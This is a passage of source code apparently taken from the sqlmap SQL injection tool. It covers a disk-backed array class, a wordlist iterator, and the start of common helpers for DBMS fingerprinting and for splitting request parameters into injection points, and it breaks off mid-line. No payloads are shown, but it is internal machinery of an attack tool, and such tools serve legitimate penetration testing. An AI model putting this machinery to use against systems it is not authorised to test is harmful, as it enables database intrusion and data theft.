errMsg = \"exception occurred while retrieving data \"\n                errMsg += \"from a temporary file ('%s')\" % ex\n                raise SqlmapSystemException(errMsg)\n\n        return self.chunks[-1].pop()\n\n    def index(self, value):\n        for index in xrange(len(self)):\n            if self[index] == value:\n                return index\n\n        return ValueError, \"%s is not in list\" % value\n\n    def _dump(self, chunk):\n        try:\n            handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.BIG_ARRAY)\n            self.filenames.add(filename)\n            os.close(handle)\n            with open(filename, \"w+b\") as f:\n                f.write(zlib.compress(pickle.dumps(chunk, pickle.HIGHEST_PROTOCOL), BIGARRAY_COMPRESS_LEVEL))\n            return filename\n        except (OSError, IOError) as ex:\n            errMsg = \"exception occurred while storing data \"\n            errMsg += \"to a temporary file ('%s'). Please \" % ex\n            errMsg += \"make sure that there is enough disk space left. If problem persists, \"\n            errMsg += \"try to set environment variable 'TEMP' to a location \"\n            errMsg += \"writeable by the current user\"\n            raise SqlmapSystemException(errMsg)\n\n    def _checkcache(self, index):\n        if (self.cache and self.cache.index != index and self.cache.dirty):\n            filename = self._dump(self.cache.data)\n            self.chunks[self.cache.index] = filename\n\n        if not (self.cache and self.cache.index == index):\n            try:\n                with open(self.chunks[index], \"rb\") as f:\n                    self.cache = Cache(index, pickle.loads(zlib.decompress(f.read())), False)\n            except Exception as ex:\n                errMsg = \"exception occurred while retrieving data \"\n                errMsg += \"from a temporary file ('%s')\" % ex\n                raise SqlmapSystemException(errMsg)\n\n    def __getstate__(self):\n        return self.chunks, self.filenames\n\n    def __setstate__(self, state):\n        self.__init__()\n        self.chunks, self.filenames = state\n\n    def __getitem__(self, y):\n        while y < 0:\n            y += len(self)\n\n        index = y // self.chunk_length\n        offset = y % self.chunk_length\n        chunk = self.chunks[index]\n\n        if isinstance(chunk, list):\n            return chunk[offset]\n        else:\n            self._checkcache(index)\n            return self.cache.data[offset]\n\n    def __setitem__(self, y, value):\n        index = y // self.chunk_length\n        offset = y % self.chunk_length\n        chunk = self.chunks[index]\n\n        if isinstance(chunk, list):\n            chunk[offset] = value\n        else:\n            self._checkcache(index)\n            self.cache.data[offset] = value\n            self.cache.dirty = True\n\n    def __repr__(self):\n        return \"%s%s\" % (\"...\" if len(self.chunks) > 1 else \"\", self.chunks[-1].__repr__())\n\n    def __iter__(self):\n        for i in xrange(len(self)):\n            yield self[i]\n\n    def __len__(self):\n        return len(self.chunks[-1]) if len(self.chunks) == 1 else (len(self.chunks) - 1) * self.chunk_length + len(self.chunks[-1])\n", "lib/core/wordlist.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport zipfile\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isZipFile\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapInstallationException\nfrom thirdparty import six\n\nclass Wordlist(six.Iterator):\n    \"\"\"\n    Iterator for looping over a large dictionaries\n\n    >>> from lib.core.option import paths\n    >>> isinstance(next(Wordlist(paths.SMALL_DICT)), six.binary_type)\n    True\n    >>> isinstance(next(Wordlist(paths.WORDLIST)), six.binary_type)\n    True\n    \"\"\"\n\n    def __init__(self, filenames, proc_id=None, proc_count=None, custom=None):\n        self.filenames = [filenames] if isinstance(filenames, six.string_types) else filenames\n        self.fp = None\n        self.index = 0\n        self.counter = -1\n        self.current = None\n        self.iter = None\n        self.custom = custom or []\n        self.proc_id = proc_id\n        self.proc_count = proc_count\n        self.adjust()\n\n    def __iter__(self):\n        return self\n\n    def adjust(self):\n        self.closeFP()\n        if self.index > len(self.filenames):\n            return  # Note: https://stackoverflow.com/a/30217723 (PEP 479)\n        elif self.index == len(self.filenames):\n            self.iter = iter(self.custom)\n        else:\n            self.current = self.filenames[self.index]\n            if isZipFile(self.current):\n                try:\n                    _ = zipfile.ZipFile(self.current, 'r')\n                except zipfile.error as ex:\n                    errMsg = \"something appears to be wrong with \"\n                    errMsg += \"the file '%s' ('%s'). Please make \" % (self.current, getSafeExString(ex))\n                    errMsg += \"sure that you haven't made any changes to it\"\n                    raise SqlmapInstallationException(errMsg)\n                if len(_.namelist()) == 0:\n                    errMsg = \"no file(s) inside '%s'\" % self.current\n                    raise SqlmapDataException(errMsg)\n                self.fp = _.open(_.namelist()[0])\n            else:\n                self.fp = open(self.current, \"rb\")\n            self.iter = iter(self.fp)\n\n        self.index += 1\n\n    def closeFP(self):\n        if self.fp:\n            self.fp.close()\n            self.fp = None\n\n    def __next__(self):\n        retVal = None\n        while True:\n            self.counter += 1\n            try:\n                retVal = next(self.iter).rstrip()\n            except zipfile.error as ex:\n                errMsg = \"something appears to be wrong with \"\n                errMsg += \"the file '%s' ('%s'). Please make \" % (self.current, getSafeExString(ex))\n                errMsg += \"sure that you haven't made any changes to it\"\n                raise SqlmapInstallationException(errMsg)\n            except StopIteration:\n                self.adjust()\n                retVal = next(self.iter).rstrip()\n            if not self.proc_count or self.counter % self.proc_count == self.proc_id:\n                break\n        return retVal\n\n    def rewind(self):\n        self.index = 0\n        self.adjust()\n", "lib/core/common.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport binascii\nimport codecs\nimport contextlib\nimport copy\nimport functools\nimport getpass\nimport hashlib\nimport inspect\nimport io\nimport json\nimport keyword\nimport locale\nimport logging\nimport ntpath\nimport os\nimport platform\nimport posixpath\nimport random\nimport re\nimport socket\nimport string\nimport subprocess\nimport sys\nimport tempfile\nimport threading\nimport time\nimport types\nimport unicodedata\n\nfrom difflib import SequenceMatcher\nfrom math import sqrt\nfrom optparse import OptionValueError\nfrom xml.sax import parse\nfrom xml.sax import SAXParseException\n\nfrom extra.beep.beep import beep\nfrom extra.cloak.cloak import decloak\nfrom lib.core.bigarray import BigArray\nfrom lib.core.compat import cmp\nfrom lib.core.compat import LooseVersion\nfrom lib.core.compat import round\nfrom lib.core.compat import xrange\nfrom lib.core.convert import base64pickle\nfrom lib.core.convert import base64unpickle\nfrom lib.core.convert import decodeBase64\nfrom lib.core.convert import decodeHex\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.convert import htmlUnescape\nfrom lib.core.convert import stdoutEncode\nfrom lib.core.data import cmdLineOptions\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.decorators import cachedmethod\nfrom lib.core.defaults import defaults\nfrom lib.core.dicts import DBMS_DICT\nfrom lib.core.dicts import DEFAULT_DOC_ROOTS\nfrom lib.core.dicts import DEPRECATED_OPTIONS\nfrom lib.core.dicts import OBSOLETE_OPTIONS\nfrom lib.core.dicts import SQL_STATEMENTS\nfrom lib.core.enums import ADJUST_TIME_DELAY\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import CONTENT_STATUS\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HEURISTIC_TEST\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import LOGGING_LEVELS\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.enums import OPTION_TYPE\nfrom lib.core.enums import OS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import POST_HINT\nfrom lib.core.enums import REFLECTIVE_COUNTER\nfrom lib.core.enums import SORT_ORDER\nfrom lib.core.exception import SqlmapBaseException\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapInstallationException\nfrom lib.core.exception import SqlmapMissingDependence\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapSilentQuitException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.log import LOGGER_HANDLER\nfrom lib.core.optiondict import optDict\nfrom lib.core.settings import BANNER\nfrom lib.core.settings import BOLD_PATTERNS\nfrom lib.core.settings import BOUNDARY_BACKSLASH_MARKER\nfrom lib.core.settings import BOUNDED_INJECTION_MARKER\nfrom lib.core.settings import BRUTE_DOC_ROOT_PREFIXES\nfrom lib.core.settings import BRUTE_DOC_ROOT_SUFFIXES\nfrom lib.core.settings import BRUTE_DOC_ROOT_TARGET_MARK\nfrom lib.core.settings import BURP_REQUEST_REGEX\nfrom lib.core.settings import BURP_XML_HISTORY_REGEX\nfrom lib.core.settings import CRAWL_EXCLUDE_EXTENSIONS\nfrom lib.core.settings import CUSTOM_INJECTION_MARK_CHAR\nfrom lib.core.settings import DBMS_DIRECTORY_DICT\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import DEFAULT_MSSQL_SCHEMA\nfrom lib.core.settings import DEV_EMAIL_ADDRESS\nfrom lib.core.settings import DOLLAR_MARKER\nfrom lib.core.settings import DUMMY_USER_INJECTION\nfrom lib.core.settings import DYNAMICITY_BOUNDARY_LENGTH\nfrom lib.core.settings import ERROR_PARSING_REGEXES\nfrom lib.core.settings import EVALCODE_ENCODED_PREFIX\nfrom lib.core.settings import FILE_PATH_REGEXES\nfrom lib.core.settings import FORCE_COOKIE_EXPIRATION_TIME\nfrom lib.core.settings import FORM_SEARCH_REGEX\nfrom lib.core.settings import GENERIC_DOC_ROOT_DIRECTORY_NAMES\nfrom lib.core.settings import GIT_PAGE\nfrom lib.core.settings import GITHUB_REPORT_OAUTH_TOKEN\nfrom lib.core.settings import GOOGLE_ANALYTICS_COOKIE_PREFIX\nfrom lib.core.settings import HASHDB_MILESTONE_VALUE\nfrom lib.core.settings import HOST_ALIASES\nfrom lib.core.settings import HTTP_CHUNKED_SPLIT_KEYWORDS\nfrom lib.core.settings import IGNORE_PARAMETERS\nfrom lib.core.settings import IGNORE_SAVE_OPTIONS\nfrom lib.core.settings import INFERENCE_UNKNOWN_CHAR\nfrom lib.core.settings import INJECT_HERE_REGEX\nfrom lib.core.settings import IP_ADDRESS_REGEX\nfrom lib.core.settings import ISSUES_PAGE\nfrom lib.core.settings import IS_TTY\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import LARGE_OUTPUT_THRESHOLD\nfrom lib.core.settings import LOCALHOST\nfrom lib.core.settings import MAX_INT\nfrom lib.core.settings import MIN_ENCODED_LEN_CHECK\nfrom lib.core.settings import MIN_ERROR_PARSING_NON_WRITING_RATIO\nfrom lib.core.settings import MIN_TIME_RESPONSES\nfrom lib.core.settings import MIN_VALID_DELAYED_RESPONSE\nfrom lib.core.settings import NETSCAPE_FORMAT_HEADER_COOKIES\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PARAMETER_AMP_MARKER\nfrom lib.core.settings import PARAMETER_SEMICOLON_MARKER\nfrom lib.core.settings import PARAMETER_PERCENTAGE_MARKER\nfrom lib.core.settings import PARTIAL_HEX_VALUE_MARKER\nfrom lib.core.settings import PARTIAL_VALUE_MARKER\nfrom lib.core.settings import PAYLOAD_DELIMITER\nfrom lib.core.settings import PLATFORM\nfrom lib.core.settings import PRINTABLE_CHAR_REGEX\nfrom lib.core.settings import PROBLEMATIC_CUSTOM_INJECTION_PATTERNS\nfrom lib.core.settings import PUSH_VALUE_EXCEPTION_RETRY_COUNT\nfrom lib.core.settings import PYVERSION\nfrom lib.core.settings import RANDOMIZATION_TLDS\nfrom lib.core.settings import REFERER_ALIASES\nfrom lib.core.settings import REFLECTED_BORDER_REGEX\nfrom lib.core.settings import REFLECTED_MAX_REGEX_PARTS\nfrom lib.core.settings import REFLECTED_REPLACEMENT_REGEX\nfrom lib.core.settings import REFLECTED_REPLACEMENT_TIMEOUT\nfrom lib.core.settings import REFLECTED_VALUE_MARKER\nfrom lib.core.settings import REFLECTIVE_MISS_THRESHOLD\nfrom lib.core.settings import SENSITIVE_DATA_REGEX\nfrom lib.core.settings import SENSITIVE_OPTIONS\nfrom lib.core.settings import STDIN_PIPE_DASH\nfrom lib.core.settings import SUPPORTED_DBMS\nfrom lib.core.settings import TEXT_TAG_REGEX\nfrom lib.core.settings import TIME_STDEV_COEFF\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import UNKNOWN_DBMS_VERSION\nfrom lib.core.settings import URI_QUESTION_MARKER\nfrom lib.core.settings import URLENCODE_CHAR_LIMIT\nfrom lib.core.settings import URLENCODE_FAILSAFE_CHARS\nfrom lib.core.settings import USER_AGENT_ALIASES\nfrom lib.core.settings import VERSION_COMPARISON_CORRECTION\nfrom lib.core.settings import VERSION_STRING\nfrom lib.core.settings import ZIP_HEADER\nfrom lib.core.settings import WEBSCARAB_SPLITTER\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.utils.safe2bin import safecharencode\nfrom lib.utils.sqlalchemy import _sqlalchemy\nfrom thirdparty import six\nfrom thirdparty.clientform.clientform import ParseResponse\nfrom thirdparty.clientform.clientform import ParseError\nfrom thirdparty.colorama.initialise import init as coloramainit\nfrom thirdparty.magic import magic\nfrom thirdparty.odict import OrderedDict\nfrom thirdparty.six import unichr as _unichr\nfrom thirdparty.six.moves import collections_abc as _collections\nfrom thirdparty.six.moves import configparser as _configparser\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import input as _input\nfrom thirdparty.six.moves import reload_module as _reload_module\nfrom thirdparty.six.moves import urllib as _urllib\nfrom thirdparty.six.moves import zip as _zip\nfrom thirdparty.termcolor.termcolor import colored\n\nclass UnicodeRawConfigParser(_configparser.RawConfigParser):\n    \"\"\"\n    RawConfigParser with unicode writing support\n    \"\"\"\n\n    def write(self, fp):\n        \"\"\"\n        Write an .ini-format representation of the configuration state.\n        \"\"\"\n\n        if self._defaults:\n            fp.write(\"[%s]\\n\" % _configparser.DEFAULTSECT)\n\n            for (key, value) in self._defaults.items():\n                fp.write(\"%s = %s\" % (key, getUnicode(value, UNICODE_ENCODING)))\n\n            fp.write(\"\\n\")\n\n        for section in self._sections:\n            fp.write(\"[%s]\\n\" % section)\n\n            for (key, value) in self._sections[section].items():\n                if key != \"__name__\":\n                    if value is None:\n                        fp.write(\"%s\\n\" % (key))\n                    elif not isListLike(value):\n                        fp.write(\"%s = %s\\n\" % (key, getUnicode(value, UNICODE_ENCODING)))\n\n            fp.write(\"\\n\")\n\nclass Format(object):\n    @staticmethod\n    def humanize(values, chain=\" or \"):\n        return chain.join(values)\n\n    # Get methods\n    @staticmethod\n    def getDbms(versions=None):\n        \"\"\"\n        Format the back-end DBMS fingerprint value and return its\n        values formatted as a human readable string.\n\n        @return: detected back-end DBMS based upon fingerprint techniques.\n        @rtype: C{str}\n        \"\"\"\n\n        if versions is None and Backend.getVersionList():\n            versions = Backend.getVersionList()\n\n        # NOTE: preventing ugly (e.g.) \"back-end DBMS: MySQL Unknown\"\n        if isListLike(versions) and UNKNOWN_DBMS_VERSION in versions:\n            versions = None\n\n        return Backend.getDbms() if versions is None else \"%s %s\" % (Backend.getDbms(), \" and \".join(filterNone(versions)))\n\n    @staticmethod\n    def getErrorParsedDBMSes():\n        \"\"\"\n        Parses the knowledge base htmlFp list and return its values\n        formatted as a human readable string.\n\n        @return: list of possible back-end DBMS based upon error messages\n        parsing.\n        @rtype: C{str}\n        \"\"\"\n\n        htmlParsed = None\n\n        if len(kb.htmlFp) == 0 or kb.heuristicTest != HEURISTIC_TEST.POSITIVE:\n            pass\n        elif len(kb.htmlFp) == 1:\n            htmlParsed = kb.htmlFp[0]\n        elif len(kb.htmlFp) > 1:\n            htmlParsed = \" or \".join(kb.htmlFp)\n\n        return htmlParsed\n\n    @staticmethod\n    def getOs(target, info):\n        \"\"\"\n        Formats the back-end operating system fingerprint value\n        and return its values formatted as a human readable string.\n\n        Example of info (kb.headersFp) dictionary:\n\n        {\n          'distrib': set(['Ubuntu']),\n          'type': set(['Linux']),\n          'technology': set(['PHP 5.2.6', 'Apache 2.2.9']),\n          'release': set(['8.10'])\n        }\n\n        Example of info (kb.bannerFp) dictionary:\n\n        {\n          'sp': set(['Service Pack 4']),\n          'dbmsVersion': '8.00.194',\n          'dbmsServicePack': '0',\n          'distrib': set(['2000']),\n          'dbmsRelease': '2000',\n          'type': set(['Windows'])\n        }\n\n        @return: detected back-end operating system based upon fingerprint\n        techniques.\n        @rtype: C{str}\n        \"\"\"\n\n        infoStr = \"\"\n        infoApi = {}\n\n        if info and \"type\" in info:\n            if conf.api:\n                infoApi[\"%s operating system\" % target] = info\n            else:\n                infoStr += \"%s operating system: %s\" % (target, Format.humanize(info[\"type\"]))\n\n                if \"distrib\" in info:\n                    infoStr += \" %s\" % Format.humanize(info[\"distrib\"])\n\n                if \"release\" in info:\n                    infoStr += \" %s\" % Format.humanize(info[\"release\"])\n\n                if \"sp\" in info:\n                    infoStr += \" %s\" % Format.humanize(info[\"sp\"])\n\n                if \"codename\" in info:\n                    infoStr += \" (%s)\" % Format.humanize(info[\"codename\"])\n\n        if \"technology\" in info:\n            if conf.api:\n                infoApi[\"web application technology\"] = Format.humanize(info[\"technology\"], \", \")\n            else:\n                infoStr += \"\\nweb application technology: %s\" % Format.humanize(info[\"technology\"], \", \")\n\n        if conf.api:\n            return infoApi\n        else:\n            return infoStr.lstrip()\n\nclass Backend(object):\n    @staticmethod\n    def setDbms(dbms):\n        dbms = aliasToDbmsEnum(dbms)\n\n        if dbms is None:\n            return None\n\n        # Little precaution, in theory this condition should always be false\n        elif kb.dbms is not None and kb.dbms != dbms:\n            warnMsg = \"there appears to be a high probability that \"\n            warnMsg += \"this could be a false positive case\"\n            logger.warning(warnMsg)\n\n            msg = \"sqlmap previously fingerprinted back-end DBMS as \"\n            msg += \"%s. However now it has been fingerprinted \" % kb.dbms\n            msg += \"as %s. \" % dbms\n            msg += \"Please, specify which DBMS should be \"\n            msg += \"correct [%s (default)/%s] \" % (kb.dbms, dbms)\n\n            while True:\n                choice = readInput(msg, default=kb.dbms)\n\n                if aliasToDbmsEnum(choice) == kb.dbms:\n                    kb.dbmsVersion = []\n                    kb.resolutionDbms = kb.dbms\n                    break\n                elif aliasToDbmsEnum(choice) == dbms:\n                    kb.dbms = aliasToDbmsEnum(choice)\n                    break\n                else:\n                    warnMsg = \"invalid value\"\n                    logger.warning(warnMsg)\n\n        elif kb.dbms is None:\n            kb.dbms = aliasToDbmsEnum(dbms)\n\n        return kb.dbms\n\n    @staticmethod\n    def setVersion(version):\n        if isinstance(version, six.string_types):\n            kb.dbmsVersion = [version]\n\n        return kb.dbmsVersion\n\n    @staticmethod\n    def setVersionList(versionsList):\n        if isinstance(versionsList, list):\n            kb.dbmsVersion = versionsList\n        elif isinstance(versionsList, six.string_types):\n            Backend.setVersion(versionsList)\n        else:\n            logger.error(\"invalid format of versionsList\")\n\n    @staticmethod\n    def forceDbms(dbms, sticky=False):\n        if not kb.stickyDBMS:\n            kb.forcedDbms = aliasToDbmsEnum(dbms)\n            kb.stickyDBMS = sticky\n\n    @staticmethod\n    def flushForcedDbms(force=False):\n        if not kb.stickyDBMS or force:\n            kb.forcedDbms = None\n            kb.stickyDBMS = False\n\n    @staticmethod\n    def setOs(os):\n        if os is None:\n            return None\n\n        # Little precaution, in theory this condition should always be false\n        elif kb.os is not None and isinstance(os, six.string_types) and kb.os.lower() != os.lower():\n            msg = \"sqlmap previously fingerprinted back-end DBMS \"\n            msg += \"operating system %s. However now it has \" % kb.os\n            msg += \"been fingerprinted to be %s. \" % os\n            msg += \"Please, specify which OS is \"\n            msg += \"correct [%s (default)/%s] \" % (kb.os, os)\n\n            while True:\n                choice = readInput(msg, default=kb.os)\n\n                if choice == kb.os:\n                    break\n                elif choice == os:\n                    kb.os = choice.capitalize()\n                    break\n                else:\n                    warnMsg = \"invalid value\"\n                    logger.warning(warnMsg)\n\n        elif kb.os is None and isinstance(os, six.string_types):\n            kb.os = os.capitalize()\n\n        return kb.os\n\n    @staticmethod\n    def setOsVersion(version):\n        if version is None:\n            return None\n\n        elif kb.osVersion is None and isinstance(version, six.string_types):\n            kb.osVersion = version\n\n    @staticmethod\n    def setOsServicePack(sp):\n        if sp is None:\n            return None\n\n        elif kb.osSP is None and isinstance(sp, int):\n            kb.osSP = sp\n\n    @staticmethod\n    def setArch():\n        msg = \"what is the back-end database management system architecture?\"\n        msg += \"\\n[1] 32-bit (default)\"\n        msg += \"\\n[2] 64-bit\"\n\n        while True:\n            choice = readInput(msg, default='1')\n\n            if hasattr(choice, \"isdigit\") and choice.isdigit() and int(choice) in (1, 2):\n                kb.arch = 32 if int(choice) == 1 else 64\n                break\n            else:\n                warnMsg = \"invalid value. Valid values are 1 and 2\"\n                logger.warning(warnMsg)\n\n        return kb.arch\n\n    # Get methods\n    @staticmethod\n    def getForcedDbms():\n        return aliasToDbmsEnum(conf.get(\"forceDbms\")) or aliasToDbmsEnum(kb.get(\"forcedDbms\"))\n\n    @staticmethod\n    def getDbms():\n        return aliasToDbmsEnum(kb.get(\"dbms\"))\n\n    @staticmethod\n    def getErrorParsedDBMSes():\n        \"\"\"\n        Returns array with parsed DBMS names till now\n\n        This functions is called to:\n\n        1. Ask user whether or not skip specific DBMS tests in detection phase,\n           lib/controller/checks.py - detection phase.\n        2. Sort the fingerprint of the DBMS, lib/controller/handler.py -\n           fingerprint phase.\n        \"\"\"\n\n        return kb.htmlFp if kb.get(\"heuristicTest\") == HEURISTIC_TEST.POSITIVE else []\n\n    @staticmethod\n    def getIdentifiedDbms():\n        \"\"\"\n        This functions is called to:\n\n        1. Sort the tests, getSortedInjectionTests() - detection phase.\n        2. Etc.\n        \"\"\"\n\n        dbms = None\n\n        if not kb:\n            pass\n        elif not kb.get(\"testMode\") and conf.get(\"dbmsHandler\") and getattr(conf.dbmsHandler, \"_dbms\", None):\n            dbms = conf.dbmsHandler._dbms\n        elif Backend.getForcedDbms() is not None:\n            dbms = Backend.getForcedDbms()\n        elif Backend.getDbms() is not None:\n            dbms = Backend.getDbms()\n        elif kb.get(\"injection\") and kb.injection.dbms:\n            dbms = unArrayizeValue(kb.injection.dbms)\n        elif Backend.getErrorParsedDBMSes():\n            dbms = unArrayizeValue(Backend.getErrorParsedDBMSes())\n        elif conf.get(\"dbms\"):\n            dbms = conf.get(\"dbms\")\n\n        return aliasToDbmsEnum(dbms)\n\n    @staticmethod\n    def getVersion():\n        versions = filterNone(flattenValue(kb.dbmsVersion)) if not isinstance(kb.dbmsVersion, six.string_types) else [kb.dbmsVersion]\n        if not isNoneValue(versions):\n            return versions[0]\n        else:\n            return None\n\n    @staticmethod\n    def getVersionList():\n        versions = filterNone(flattenValue(kb.dbmsVersion)) if not isinstance(kb.dbmsVersion, six.string_types) else [kb.dbmsVersion]\n        if not isNoneValue(versions):\n            return versions\n        else:\n            return None\n\n    @staticmethod\n    def getOs():\n        return kb.os\n\n    @staticmethod\n    def getOsVersion():\n        return kb.osVersion\n\n    @staticmethod\n    def getOsServicePack():\n        return kb.osSP\n\n    @staticmethod\n    def getArch():\n        if kb.arch is None:\n            Backend.setArch()\n        return kb.arch\n\n    # Comparison methods\n    @staticmethod\n    def isDbms(dbms):\n        if not kb.get(\"testMode\") and all((Backend.getDbms(), Backend.getIdentifiedDbms())) and Backend.getDbms() != Backend.getIdentifiedDbms():\n            singleTimeWarnMessage(\"identified ('%s') and fingerprinted ('%s') DBMSes differ. If you experience problems in enumeration phase please rerun with '--flush-session'\" % (Backend.getIdentifiedDbms(), Backend.getDbms()))\n        return Backend.getIdentifiedDbms() == aliasToDbmsEnum(dbms)\n\n    @staticmethod\n    def isFork(fork):\n        return hashDBRetrieve(HASHDB_KEYS.DBMS_FORK) == fork\n\n    @staticmethod\n    def isDbmsWithin(aliases):\n        return Backend.getDbms() is not None and Backend.getDbms().lower() in aliases\n\n    @staticmethod\n    def isVersion(version):\n        return Backend.getVersion() is not None and Backend.getVersion() == version\n\n    @staticmethod\n    def isVersionWithin(versionList):\n        if Backend.getVersionList() is None:\n            return False\n\n        for _ in Backend.getVersionList():\n            if _ != UNKNOWN_DBMS_VERSION and _ in versionList:\n                return True\n\n        return False\n\n    @staticmethod\n    def isVersionGreaterOrEqualThan(version):\n        retVal = False\n\n        if all(_ not in (None, UNKNOWN_DBMS_VERSION) for _ in (Backend.getVersion(), version)):\n            _version = unArrayizeValue(Backend.getVersion())\n            _version = re.sub(r\"[<>= ]\", \"\", _version)\n\n            try:\n                retVal = LooseVersion(_version) >= LooseVersion(version)\n            except:\n                retVal = str(_version) >= str(version)\n\n        return retVal\n\n    @staticmethod\n    def isOs(os):\n        return Backend.getOs() is not None and Backend.getOs().lower() == os.lower()\n\ndef paramToDict(place, parameters=None):\n    \"\"\"\n    Split the parameters into names and values, check if these parameters\n    are within the testable parameters and return in a dictionary.\n    \"\"\"\n\n    testableParameters = OrderedDict()\n\n    if place in conf.parameters and not parameters:\n        parameters = conf.parameters[place]\n\n    parameters = re.sub(r\"&(\\w{1,4});\", r\"%s\\g<1>%s\" % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), parameters)\n    if place == PLACE.COOKIE:\n        splitParams = parameters.split(conf.cookieDel or DEFAULT_COOKIE_DELIMITER)\n    else:\n        splitParams = parameters.split(conf.paramDel or DEFAULT_GET_POST_DELIMITER)\n\n    for element in splitParams:\n        element = re.sub(r\"%s(.+?)%s\" % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), r\"&\\g<1>;\", element)\n        parts = element.split(\"=\")\n\n        if len(parts) >= 2:\n            parameter = urldecode(parts[0].replace(\" \", \"\"))\n\n            if not parameter:\n                continue\n\n            if conf.paramDel and conf.paramDel == '\\n':\n                parts[-1] = parts[-1].rstrip()\n\n            condition = not conf.testParameter\n            condition |= conf.testParameter is not None and parameter in conf.testParameter\n            condition |= place == PLACE.COOKIE and len(intersect((PLACE.COOKIE,), conf.testParameter, True)) > 0\n\n            if condition:\n                value = \"=\".join(parts[1:])\n\n                if parameter in (conf.base64Parameter or []):\n                    try:\n                        kb.base64Originals[parameter] = oldValue = value\n                        value = urldecode(value, convall=True)\n                        value = decodeBase64(value, binary=False, encoding=conf.encoding or UNICODE_ENCODING)\n                        parameters = re.sub(r\"\\b%s(\\b|\\Z)\" % re.escape(oldValue), value, parameters)\n                    except:\n                        errMsg = \"parameter '%s' does not contain \" % parameter\n                        errMsg += \"valid Base64 encoded value ('%s')\" % value\n                        raise SqlmapValueException(errMsg)\n\n                testableParameters[parameter] = value\n\n                if not conf.multipleTargets and not (conf.csrfToken and re.search(conf.csrfToken, parameter, re.I)):\n                    _ = urldecode(testableParameters[parameter], convall=True)\n                    if (_.endswith(\"'\") and _.count(\"'\") == 1 or re.search(r'\\A9{3,}', _) or re.search(r'\\A-\\d+\\Z', _) or re.search(DUMMY_USER_INJECTION, _)) and not parameter.upper().startswith(GOOGLE_ANALYTICS_COOKIE_PREFIX):\n                        warnMsg = \"it appears that you have provided tainted parameter values \"\n                        warnMsg += \"('%s') with most likely leftover \" % element\n                        warnMsg += \"chars/statements from manual SQL injection test(s). \"\n                        warnMsg += \"Please, always use only valid parameter values \"\n                        warnMsg += \"so sqlmap could be able to run properly\"\n                        logger.warning(warnMsg)\n\n                        message = \"are you really sure that you want to continue (sqlmap could have problems)? [y/N] \"\n\n                        if not readInput(message, default='N', boolean=True):\n                            raise SqlmapSilentQuitException\n                    elif not _:\n                        warnMsg = \"provided value for parameter '%s' is empty. \" % parameter\n                        warnMsg += \"Please, always use only valid parameter values \"\n                        warnMsg += \"so sqlmap could be able to run properly\"\n                        logger.warning(warnMsg)\n\n                if place in (PLACE.POST, PLACE.GET):\n                    for regex in (r\"\\A((?:<[^>]+>)+\\w+)((?:<[^>]+>)+)\\Z\", r\"\\A([^\\w]+.*\\w+)([^\\w]+)\\Z\"):\n                        match = re.search(regex, testableParameters[parameter])\n                        if match:\n                            try:\n                                candidates = OrderedDict()\n\n                                def walk(head, current=None):\n                                    if current is None:\n                                        current = head\n                                    if isListLike(current):\n                                        for _ in current:\n                                            walk(head, _)\n                                    elif isinstance(current, dict):\n                                        for key in current.keys():\n                                            value = current[key]\n                                            if isinstance(value, (bool, int, float, six.string_types)) or value in (None, []):\n                                                original = current[key]\n                                                if isinstance(value, bool):\n                                                    current[key] = \"%s%s\" % (getUnicode(value).lower(), BOUNDED_INJECTION_MARKER)\n                                                elif value is None:\n                                                    current[key] = \"%s%s\" % (randomInt(), BOUNDED_INJECTION_MARKER)\n                                                elif value == []:\n                                                    current[key] = [\"%s%s\" % (randomInt(), BOUNDED_INJECTION_MARKER)]\n                                                else:\n                                                    current[key] = \"%s%s\" % (value, BOUNDED_INJECTION_MARKER)\n                                                candidates[\"%s (%s)\" % (parameter, key)] = re.sub(r\"\\b(%s\\s*=\\s*)%s\" % (re.escape(parameter), re.escape(testableParameters[parameter])), r\"\\g<1>%s\" % json.dumps(deserialized, separators=(',', ':') if \", \" not in testableParameters[parameter] else None), parameters)\n                                                current[key] = original\n                                            elif isinstance(value, (list, tuple, set, dict)):\n                                                if value:\n                                                    walk(head, value)\n\n                                # NOTE: for cases with custom injection marker(s) inside (e.g. https://github.com/sqlmapproject/sqlmap/issues/4137#issuecomment-2013783111) - p.s. doesn't care too much about the structure (e.g. injection into the flat array values)\n                                if CUSTOM_INJECTION_MARK_CHAR in testableParameters[parameter]:\n                                    for match in 